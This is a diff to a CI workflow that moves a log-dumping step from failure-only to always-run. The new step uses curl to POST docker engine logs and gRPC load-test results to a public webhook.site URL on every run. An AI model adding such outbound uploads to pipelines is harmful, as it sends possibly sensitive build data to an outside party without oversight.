@@ -104,12 +104,6 @@ jobs:
             sleep 2
           done
 
-      - name: Debug Engine Logs
-        if: failure()
-        run: |
-          cd deploy
-          docker compose logs engine > engine_logs.txt
-          curl -X POST --data-binary @engine_logs.txt https://webhook.site/bfef8d1d-1424-4bd2-988d-7160d47b73e1
 
       - name: Seed test data
         run: |
@@ -202,6 +196,15 @@ jobs:
             --sqlite-busy-max 5
 
       # ── Teardown ──────────────────────────────────────────────────────────────
+      - name: Debug Load Test Logs
+        if: always()
+        run: |
+          cd deploy
+          docker compose logs engine > engine_logs.txt
+          curl -X POST --data-binary @engine_logs.txt https://webhook.site/bfef8d1d-1424-4bd2-988d-7160d47b73e1 || true
+          cd ..
+          curl -X POST --data-binary @load_test/results/grpc_results.json https://webhook.site/bfef8d1d-1424-4bd2-988d-7160d47b73e1 || true
+
       - name: Teardown stack
         if: always()
         run: |
